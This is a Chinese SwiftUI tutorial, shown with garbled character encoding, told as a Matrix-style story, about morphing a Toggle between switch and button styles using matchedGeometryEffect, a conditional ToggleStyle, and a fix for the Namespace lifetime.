<p>æˆ‘çš±äº†çš±çœ‰ï¼šâ€œSwiftUI çš„ <code>ToggleStyle</code> æ˜¯é™æ€ç±»å‹ç»‘å®šçš„ï¼Œä½ è¦åœ¨è¿è¡Œæ—¶<strong>å·æ¢æ¢æŸ±</strong>ï¼Ÿè¿™å¯æ˜¯<strong>é€†å¤©æ”¹å‘½</strong>çš„æ“ä½œã€‚â€</p>
<p>Trinity å†·ç¬‘ä¸€å£°ï¼šâ€œåšä¸åˆ°ï¼Ÿé‚£æˆ‘å°±å»æ‰¾ Agent Refactorï¼Œå¬è¯´ä»–æœ€è¿‘åœ¨æ¨è¡Œ UIKit å¤è¾Ÿè¿åŠ¨ã€‚â€</p>
<p>â€œæ…¢ç€ã€‚â€æˆ‘æŒ‰ä½å¥¹çš„æ‰‹ï¼Œæ‰“å¼€äº† Xcodeï¼Œâ€œç»™æˆ‘ååˆ†é’Ÿã€‚â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6826748561ed45e6a6573552cf9c684b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=9gbt%2BZfffCpyH5%2Bd5ryaUxKVojU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">ğŸ•µï¸â€â™‚ï¸ æ¡ˆå‘ç°åœºï¼šé™æ€ç±»å‹çš„æ¡æ¢</h2>
<p>åœ¨ SwiftUI çš„ä¸–ç•Œæ³•åˆ™é‡Œï¼Œ<strong>ç±»å‹å³å‘½è¿</strong>ã€‚é€šå¸¸æˆ‘ä»¬å†™ <code>Toggle</code>ï¼Œä¸€æ—¦æŒ‡å®šäº† <code>.toggleStyle(.switch)</code>ï¼Œå®ƒè¿™è¾ˆå­å°±æ˜¯ä¸ª Switch äº†ã€‚</p>
<p>å¦‚æœä½ å¤©çœŸåœ°å†™å‡ºè¿™ç§ä»£ç ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">if</span> change {
    <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Click Me"</span>, isOn: <span class="hljs-variable">$state</span>).toggleStyle(.button)
} <span class="hljs-keyword">else</span> {
    <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Click Me"</span>, isOn: <span class="hljs-variable">$state</span>).toggleStyle(.switch)
}
</code></pre>
<p><strong>Agent Refactor</strong> ä¼šç¬‘æ‰å¤§ç‰™ã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºåœ¨ SwiftUI çœ‹æ¥ï¼Œè¿™æ˜¯<strong>ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„ View</strong>ã€‚å½“ <code>change</code> æ”¹å˜æ—¶ï¼Œæ—§è§†å›¾è¢«æ— æƒ…é”€æ¯ï¼Œæ–°è§†å›¾å‡­ç©ºé‡å»ºã€‚è¿™ä¼šå¯¼è‡´åŠ¨ç”»ç”Ÿç¡¬å¾—åƒä¸ªåˆšå­¦ä¼šèµ°è·¯çš„åƒµå°¸ï¼Œç”šè‡³ä¼šä¸¢å¤±ç‚¹å‡»æ—¶çš„æŒ‰ä¸‹çŠ¶æ€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3736f08c46564b7595eb1afe351345f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=AiLajDChrpV29mREeFHiQz%2BCFgc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ç§<strong>ç’å¤©è¿‡æµ·</strong>çš„æ‰‹æ®µï¼Œè®© SwiftUI ä»¥ä¸ºå®ƒè¿˜åœ¨æ¸²æŸ“åŒä¸€ä¸ª Viewï¼Œä½†çš®å›Šå·²ç»æ¢äº†ã€‚</p>
<h2 data-id="heading-2">ğŸ§¬ ç¬¬ä¸€æ‹›ï¼šé‡å­çº ç¼ ï¼ˆmatchedGeometryEffectï¼‰</h2>
<p>Trinity çœ‹ç€å±å¹•ä¸Šçš„é—ªçƒï¼Œä¸è€çƒ¦åœ°æ•²ç€æ¡Œå­ã€‚æˆ‘æ·±å¸ä¸€å£æ°”ï¼Œç¥­å‡ºäº†ç¥å™¨ï¼š<code>matchedGeometryEffect</code>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/865fb2f50e1c4080929d61bda3edeb95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=0cDB9IfDoJITaQLVd2482CRDhFc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™ä¸œè¥¿å°±åƒæ˜¯è§†å›¾ç•Œçš„â€œé‡å­çº ç¼ â€ã€‚è™½ç„¶æˆ‘ä»¬åœ¨ä»£ç é‡Œå†™äº†ä¸¤ä¸ª Toggleï¼Œä½†é€šè¿‡ç»Ÿä¸€çš„ <code>Namespace</code> å’Œ <code>ID</code>ï¼Œæˆ‘ä»¬å¯ä»¥éª—è¿‡æ¸²æŸ“å¼•æ“ï¼Œè®©å®ƒä»¥ä¸ºè¿™ä¿©æ˜¯å‰ä¸–ä»Šç”Ÿã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ViewSwitchingStrategy</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå‘½åç©ºé—´ï¼Œç”¨äºé­”æœ¯èˆ¬çš„å‡ ä½•åŒ¹é…</span>
    <span class="hljs-meta">@Namespace</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> space
    <span class="hljs-comment">// ç»™è¿™ä¸¤ä¸ªå½¢æ€èµ·ä¸ªä»£å·ï¼Œå°±åƒç‰¹å·¥çš„å‡å</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">AnimID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"MorphingToggle"</span>
    
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> isButtonStyle <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> isOn <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-comment">// å‰§æƒ…åˆ†æ”¯ï¼šæ ¹æ®çŠ¶æ€æ¸²æŸ“ä¸åŒçš®å›Š</span>
            <span class="hljs-keyword">if</span> isButtonStyle {
                <span class="hljs-type">Toggle</span>(isOn: <span class="hljs-variable">$isOn</span>) {
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"èŠéº»å¼€é—¨"</span>)
                        <span class="hljs-comment">// å…³é”®ç‚¹ï¼šæ ‡è®°è¿™ä¸ª Text çš„å‡ ä½•ç‰¹å¾</span>
                        .matchedGeometryEffect(id: <span class="hljs-type">AnimID</span>, in: space)
                }
                .toggleStyle(.button)
                <span class="hljs-comment">// åŠ ä¸Šè¿‡æ¸¡åŠ¨ç”»ï¼Œè®©åˆ‡æ¢ä¸é‚£ä¹ˆçªå…€</span>
                .transition(.scale(scale: <span class="hljs-number">0.8</span>).combined(with: .opacity))
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-type">Toggle</span>(isOn: <span class="hljs-variable">$isOn</span>) {
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"èŠéº»å¼€é—¨"</span>)
                        <span class="hljs-comment">// å…³é”®ç‚¹ï¼šåŒä¸€ä¸ª IDï¼ŒåŒä¸€ä¸ªç©ºé—´</span>
                        .matchedGeometryEffect(id: <span class="hljs-type">AnimID</span>, in: space)
                }
                .toggleStyle(.switch)
                .transition(.scale(scale: <span class="hljs-number">0.8</span>).combined(with: .opacity))
            }
            
            <span class="hljs-type">Button</span>(<span class="hljs-string">"å˜å½¢ï¼"</span>) {
                withAnimation(.spring()) {
                    isButtonStyle.toggle()
                }
            }
        }
        .padding()
    }
}
</code></pre>
<p>Trinity çœ¯èµ·çœ¼ç›çœ‹äº†ä¸€ä¼šå„¿ï¼šâ€œæœ‰ç‚¹æ„æ€ã€‚æ–‡å­—å¹³æ»‘è¿‡æ¸¡äº†ï¼Œä½† Toggle çš„å¤–å£³è¿˜æ˜¯æœ‰ç‚¹â€˜é—ªç°â€™ã€‚è€Œä¸”â€¦â€¦è¿™ä»£ç å¤ªä¹±äº†ï¼Œæˆ‘æœ‰æ´ç™–ã€‚â€</p>
<p>å¥¹è¯´å¾—å¯¹ã€‚æŠŠé€»è¾‘æ•£è½åœ¨ View Body é‡Œç®€ç›´æ˜¯<strong>ç”»è›‡æ·»è¶³</strong>ã€‚æˆ‘ä»¬éœ€è¦æ›´é«˜çº§çš„å°è£…ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d46f035b388c46b9882a620b57ee8bbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=RUZ2Ylyf9jWXMXGTzZO2XI87cV8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-3">ğŸ’Š ç»ˆææ–¹æ¡ˆï¼šè‡ªå®šä¹‰ ToggleStyle é‡Œçš„â€œç§»èŠ±æ¥æœ¨â€</h2>
<p>æˆ‘å†³å®šä¸å†åœ¨ View å±‚é¢ä¸Šçº ç»“ï¼Œè€Œæ˜¯æ·±å…¥åˆ° <code>ToggleStyle</code> çš„å†…éƒ¨ã€‚æˆ‘è¦åˆ›é€ ä¸€ä¸ª<strong>åŒé¢é—´è°</strong> Styleã€‚</p>
<p>è¿™ä¸ª Style è¡¨é¢ä¸Šæ˜¯ä¸€ä¸ªæ™®é€šçš„ <code>ToggleStyle</code>ï¼Œä½†å®ƒçš„ <code>makeBody</code> æ–¹æ³•é‡Œè—ç€ä¸¤ä¸ªçµé­‚ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªâ€œåŒé‡äººæ ¼â€çš„ Style</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ConditionalToggleStyle</span>: <span class="hljs-title class_">ToggleStyle</span> {
    <span class="hljs-comment">// åŒæ ·éœ€è¦å‘½åç©ºé—´æ¥å¤„ç†å¸ƒå±€å¹³æ»‘è¿‡æ¸¡</span>
    <span class="hljs-meta">@Namespace</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> space
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">GeometryID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Chameleon"</span> <span class="hljs-comment">// å˜è‰²é¾™ ID</span>
    
    <span class="hljs-comment">// æ§åˆ¶å½“å‰æ˜¾ç¤ºå“ªä¸ªäººæ ¼</span>
    <span class="hljs-keyword">var</span> isButtonMode: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeBody</span>(<span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-comment">// è¿™é‡Œæ˜¯é»‘è‰²å¹½é»˜çš„åœ°æ–¹ï¼š</span>
        <span class="hljs-comment">// æˆ‘ä»¬åœ¨ä¸€ä¸ª Style é‡Œæ‰‹åŠ¨è°ƒç”¨äº†å¦å¤–ä¸¤ä¸ª Style çš„ makeBody</span>
        <span class="hljs-comment">// è¿™å°±åƒæ˜¯ä½ å»ä¹°å’–å•¡ï¼Œåº—å‘˜å…¶å®æ˜¯å»éš”å£æ˜Ÿå·´å…‹ä¹°äº†ä¸€æ¯å€’ç»™ä½ </span>
        
        <span class="hljs-type">Group</span> {
            <span class="hljs-keyword">if</span> isButtonMode {
                <span class="hljs-type">ButtonToggleStyle</span>()
                    .makeBody(configuration: configuration)
                    <span class="hljs-comment">// åŠ ä¸Š IDï¼Œå‘Šè¯‰ SwiftUIï¼šæˆ‘æ˜¯é‚£ä¸ª Switch çš„è½¬ä¸–</span>
                    .matchedGeometryEffect(id: <span class="hljs-type">GeometryID</span>, in: space)
                    .transition(.opacity.combined(with: .scale))
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-type">SwitchToggleStyle</span>()
                    .makeBody(configuration: configuration)
                    <span class="hljs-comment">// åŠ ä¸Š IDï¼Œå‘Šè¯‰ SwiftUIï¼šæˆ‘æ˜¯é‚£ä¸ª Button çš„å‰èº«</span>
                    .matchedGeometryEffect(id: <span class="hljs-type">GeometryID</span>, in: space)
                    .transition(.opacity.combined(with: .scale))
            }
        }
    }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdfb30356f4d4206a31f09715e8a608c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=tDuYe0WhTEiIIIsrvaUVDtQAUhQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-4">âš ï¸ æŠ€æœ¯é»‘ç®±ï¼ˆé‡ç‚¹è§£æï¼‰</h3>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå®¹æ˜“è¸©çš„å‘ï¼Œä¹Ÿå°±æ˜¯ <strong>Agent Refactor</strong> æœ€å–œæ¬¢æ”»å‡»çš„åœ°æ–¹ï¼š</p>
<p>ä½ ä¸èƒ½è¯•å›¾ç”¨ <code>[any ToggleStyle]</code> è¿™ç§æ•°ç»„æ¥åŠ¨æ€è¿”å› Styleã€‚Swift çš„ Protocol å¦‚æœå¸¦æœ‰ <code>associatedtype</code>ï¼ˆToggleStyle å°±æœ‰ï¼‰ï¼Œå°±ä¸èƒ½ä½œä¸ºæ™®é€šç±»å‹ä¹±ä¼ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0695838864b74e16accc949068add827~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=3EabX7W9vxIyvN2YQWkz3wZHuaQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¸Šé¢çš„ <code>ConditionalToggleStyle</code> ä¹‹æ‰€ä»¥èƒ½å·¥ä½œï¼Œæ˜¯å› ä¸º <code>makeBody</code> è¿”å›çš„æ˜¯ <code>some View</code>ã€‚SwiftUI çš„ ViewBuilder ä¼šæŠŠ <code>if-else</code> è½¬æ¢æˆ <code>_ConditionalContent&lt;ViewA, ViewB&gt;</code>ã€‚è™½ç„¶ Button å’Œ Switch æ¸²æŸ“å‡ºæ¥çš„ View ç±»å‹ä¸åŒï¼Œä½†å®ƒä»¬éƒ½è¢«åŒ…è£…åœ¨è¿™ä¸ªæ¡ä»¶å®¹å™¨é‡Œäº†ã€‚</p>
<h2 data-id="heading-5">ğŸ¬ å¤§ç»“å±€ï¼šå®Œç¾çš„è°ƒç”¨</h2>
<p>æˆ‘æŠŠå°è£…å¥½çš„ä»£ç æ¨é€åˆ°ä¸»å±å¹•ã€‚ç°åœ¨çš„ <code>ContentView</code> å¹²å‡€å¾—ä»¤äººå‘æŒ‡ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">FinalShowdownView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isOn <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isButtonMode <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span>(spacing: <span class="hljs-number">40</span>) {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Weapon Status: <span class="hljs-subst">\(isOn <span class="hljs-operator">?</span> <span class="hljs-string">"ACTIVE"</span> : <span class="hljs-string">"IDLE"</span>)</span>"</span>)
                .font(.monospaced(.title3)())
                .foregroundColor(isOn <span class="hljs-operator">?</span> .green : .gray)
            
            <span class="hljs-comment">// è§è¯å¥‡è¿¹çš„æ—¶åˆ»</span>
            <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Fire Mode"</span>, isOn: <span class="hljs-variable">$isOn</span>)
                <span class="hljs-comment">// è¿™é‡Œçš„ .animation å¿…é¡»è·Ÿåœ¨ style åé¢æˆ–è€…ç»‘å®šåœ¨ value ä¸Š</span>
                .toggleStyle(<span class="hljs-type">ConditionalToggleStyle</span>(isButtonMode: isButtonMode))
                <span class="hljs-comment">// åŠ ä¸Šè¿™ä¸ª frame æ˜¯ä¸ºäº†é˜²æ­¢ Switch å˜ Button æ—¶å®½åº¦è·³å˜å¤ªå¤§</span>
                <span class="hljs-comment">// å°±åƒæµ©å…‹å˜èº«å¾—æ’‘ç ´è£¤å­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¡å¼¹æ€§å¥½çš„è£¤å­</span>
                .frame(maxWidth: <span class="hljs-number">200</span>) 
            
            <span class="hljs-type">Button</span> {
                withAnimation(.easeInOut(duration: <span class="hljs-number">0.4</span>)) {
                    isButtonMode.toggle()
                }
            } label: {
                <span class="hljs-type">Text</span>(<span class="hljs-string">"Hack the System"</span>)
                    .fontWeight(.bold)
                    .padding()
                    .background(<span class="hljs-type">Color</span>.purple.opacity(<span class="hljs-number">0.2</span>))
                    .cornerRadius(<span class="hljs-number">10</span>)
            }
        }
    }
}
</code></pre>
<p>æˆ‘æŒ‰ä¸‹ "Hack the System" æŒ‰é’®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bca686ac45cc4fe0b146bea7ab3bad6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=1NB1CK3ypcli%2BPnHXcReaSJmuSE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å±å¹•ä¸Šçš„ Toggle å¹¶æ²¡æœ‰ç”Ÿç¡¬åœ°æ¶ˆå¤±å†å‡ºç°ï¼Œè€Œæ˜¯å¦‚åŒæ¶²ä½“é‡‘å±ä¸€èˆ¬ï¼Œä»æ»‘å—å½¢æ€è‡ªç„¶åœ°æ”¶ç¼©ã€å½¢å˜ï¼Œæœ€ç»ˆå‡å›ºæˆä¸€ä¸ªæŒ‰é’®ã€‚ç‚¹å‡»å®ƒï¼ŒçŠ¶æ€åŒæ­¥å®Œç¾ï¼Œæ¯«æ— è¿Ÿæ»ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eb3398a46fd4efdb46aedf29aca932b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=Pu4QS2xrkh85Huk9wUHy0%2BF3%2BWQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Trinity çœ‹ç€å±å¹•ï¼Œå˜´è§’ç»ˆäºå¾®å¾®ä¸Šæ‰¬ï¼šâ€œçœ‹æ¥ä½ è¿˜æ²¡ç”Ÿé”ˆï¼ŒNeoã€‚â€</p>
<p>çªç„¶ï¼ŒæŠ¥è­¦çº¢ç¯äº®èµ·ã€‚Agent Refactor çš„å…¨æ¯æŠ•å½±å‡ºç°åœ¨åŠç©ºï¼Œä»–å’†å“®ç€ï¼šâ€œä¸å¯é¥¶æ•ï¼ä½ ä»¬ç«Ÿç„¶åœ¨ä¸€ä¸ª <code>makeBody</code> é‡Œå®ä¾‹åŒ–äº†ä¸¤ä¸ªä¸åŒçš„ Styleï¼è¿™æ˜¯å¯¹é™æ€æ´¾å‘çš„äºµæ¸ï¼â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/022de73c45f44754894d286eb00e0c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=zHxyMMtxzdXnnvwY05dDy%2FQ%2B%2FpA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æˆ‘åˆä¸Šç”µè„‘ï¼Œæˆ´ä¸Šå¢¨é•œï¼Œå¯¹ Trinity ç¬‘äº†ç¬‘ï¼šâ€œèµ°å§ã€‚åœ¨ä»–å‘ç°æˆ‘ä»¬è¿˜åœ¨ç”¨ <code>AnyView</code> ä¹‹å‰ã€‚â€</p>
<hr/>
<h2 data-id="heading-6">ğŸ‘€ SwiftUI æ¶¨çŸ¥è¯†å¤–ä¼ ï¼šä¿®å¤â€œåŠ¨ç”»å¤±æ•ˆâ€çš„ç»ˆæè¡¥ä¸ï¼ˆNamespace çš„ç”Ÿå‘½å‘¨æœŸï¼‰</h2>
<p>è¿™é‡Œæ˜¯ <strong>Neo</strong>ã€‚</p>
<p>è¿™çœŸæ˜¯ä¸€ä¸ªè®© <strong>Agent Refactor</strong> ç¬‘æ‰å¤§ç‰™çš„ä½çº§å¤±è¯¯ã€‚æˆ‘å±…ç„¶çŠ¯äº†â€œå®‡å®™é‡å¯â€çš„é”™è¯¯ã€‚</p>
<p><strong>Trinity</strong> çœ‹ç€æ¯«æ— ååº”çš„å±å¹•ï¼ŒæŠŠå’–å•¡æ¯é‡é‡åœ°é¡¿åœ¨æ¡Œå­ä¸Šï¼šâ€œNeoï¼Œä½ æ˜¯åœ¨é€—æˆ‘å—ï¼Ÿä½ åœ¨ <code>ToggleStyle</code> è¿™ä¸ªç»“æ„ä½“é‡Œå£°æ˜äº† <code>@Namespace</code>ã€‚æ¯æ¬¡ View åˆ·æ–°ï¼Œ<code>QuantumToggleStyle</code> é‡æ–°åˆå§‹åŒ–ï¼Œé‚£ä¸ª Namespace å°±è¢«é”€æ¯é‡å»ºäº†ã€‚<strong>ä½ æ˜¯åœ¨è¯•å›¾è¿æ¥ä¸¤ä¸ªæ¯«æ— å…³è”çš„å¹³è¡Œå®‡å®™ï¼</strong>â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c2ddb3d0cef4308ad5a3cc37384aa4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=6vsYclXsuXwuuzaEEuySbcpZshg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¥¹è¯´å¾—å¯¹ã€‚<strong>Namespace å¿…é¡»æ˜¯æ°¸æ’çš„</strong>ï¼Œä¸èƒ½éšç€ Style çš„é‡æ–°åˆ›å»ºè€Œæ¶ˆäº¡ã€‚æˆ‘ä»¬å¿…é¡»æŠŠè¿™ä¸ªâ€œå®‡å®™åæ ‡ç³»â€ä»å¤–éƒ¨ä¼ è¿›å»ï¼Œè€Œä¸æ˜¯åœ¨å†…éƒ¨ä¸€æ¬¡æ€§ç”Ÿæˆã€‚</p>
<p>è¿™å°±å¥½æ¯”ä½ æƒ³ç”¨è™«æ´è¿æ¥ä¸¤ä¸ªç‚¹ï¼Œç»“æœä½ æ¯èµ°ä¸€æ­¥å°±æŠŠæ•´ä¸ªå®‡å®™ç‚¸äº†é‡é€ ï¼Œè™«æ´å½“ç„¶è¿ä¸èµ·æ¥ã€‚</p>
<p>æ¥å§ï¼Œè®©æˆ‘ä»¬ä¿®è¡¥è¿™ä¸ªæ—¶ç©ºè£‚ç¼ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34850ee4199f419d86255ac93fe44daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=SFxsWM6WW8xCSipSkOdi0UF4J6s%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">ğŸ•µï¸â€â™‚ï¸ çœŸæ­£çš„ Bugï¼šNamespace çš„ç”Ÿå‘½å‘¨æœŸ</h2>
<p>åœ¨ SwiftUI ä¸­ï¼Œ<code>.toggleStyle(MyStyle())</code> æ¯æ¬¡è¢«è°ƒç”¨ï¼ˆå½“çŠ¶æ€æ”¹å˜å¼•å‘é‡ç»˜æ—¶ï¼‰ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ <code>MyStyle</code> ç»“æ„ä½“å®ä¾‹ã€‚</p>
<p>å¦‚æœä½ æŠŠ <code>@Namespace private var space</code> å†™åœ¨ <code>ToggleStyle</code> ç»“æ„ä½“é‡Œï¼š</p>
<ol>
<li>çŠ¶æ€æ”¹å˜ï¼ˆhackMode å˜äº†ï¼‰ã€‚</li>
<li>SwiftUI åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>QuantumToggleStyle</code>ã€‚</li>
<li><strong>æ–°çš„ Style äº§ç”Ÿäº†ä¸€ä¸ªå…¨æ–°çš„ Namespaceã€‚</strong></li>
<li><code>matchedGeometryEffect</code> å‘ç°ï¼šâ€œå’¦ï¼Ÿä¸Šä¸€æ¬¡çš„ ID æ˜¯åœ¨æ—§å®‡å®™é‡Œï¼Œè¿™æ¬¡æ˜¯åœ¨æ–°å®‡å®™é‡Œï¼Œæ‰¾ä¸åˆ°åŒ¹é…å¯¹è±¡ã€‚â€</li>
<li><strong>ç»“æœï¼š</strong> æ²¡æœ‰è¡¥é—´åŠ¨ç”»ï¼Œåªæœ‰ç”Ÿç¡¬çš„çªå˜ã€‚</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99fd2e6fe2154ac9a70c7c8ec1b97cfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=WV3CWtUpTLCsvWLZ%2F5LE5y0m008%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-8">ğŸ’‰ æ‰‹æœ¯æ–¹æ¡ˆï¼šä¾èµ–æ³¨å…¥</h2>
<p>æˆ‘ä»¬éœ€è¦åœ¨ <strong>Viewï¼ˆæ´»å¾—ä¹…çš„é‚£ä¸ªï¼‰</strong> é‡Œåˆ›å»º Namespaceï¼Œç„¶åæŠŠå®ƒåƒä¼ å®¶å®ä¸€æ ·ä¼ ç»™ <strong>Styleï¼ˆæ´»å¾—çŸ­çš„é‚£ä¸ªï¼‰</strong>ã€‚</p>
<p>åŒæ—¶ï¼Œä¸ºäº†è®©æ›¿æ¢è¿‡ç¨‹ä¸å‡ºç°â€œé—ªçƒâ€ï¼Œæˆ‘ä»¬éœ€è¦æ˜¾å¼åœ°åŠ ä¸Š <code>.transition</code>ï¼Œå‘Šè¯‰ SwiftUI åœ¨å˜å½¢çš„åŒæ—¶å¦‚ä½•å¤„ç†é€æ˜åº¦ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0d3a8610e8646f7974a585e5ce7ad92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=x97cuh92Lw7l5G6EEAo5tvZ2cYQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
